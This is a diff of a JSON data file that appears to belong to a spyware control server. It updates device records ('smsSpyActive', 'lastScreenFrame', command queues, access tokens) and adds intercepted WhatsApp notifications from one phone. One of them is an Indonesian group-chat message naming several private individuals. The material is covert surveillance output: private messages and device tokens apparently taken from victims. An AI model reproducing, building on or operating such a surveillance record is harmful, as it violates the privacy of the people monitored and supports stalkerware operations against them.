@@ -4037,7 +4037,7 @@
     "deviceName": "HP-MEMEM-A001",
     "ownerUsername": "RIXX09",
     "token": "fb008139c6083d4cb9aa61f99b737696",
-    "lastSeen": 1777251885932,
+    "lastSeen": 1777252299360,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:56:32.130Z",
@@ -9361,7 +9361,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777252270574,
+    "lastSeen": 1777252300603,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -9377,6 +9377,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎48 pesan dari 4 chat",
+        "time": "27/04 09:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777252301307
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (8 pesan): ~ Nur Aeda",
+        "content": "Inshaa Allah ikut linedance besok Senin di rumahx Hj Rosmini\n1.Hj Rosmini\n2.fany\n3.Ika\n4.dg sakking\n5.eda\nDst ....\nHanya setiap Senin, Krn kamis saya di sanggar senam the Vavad jipang raya",
+        "time": "27/04 09:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777252301133
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
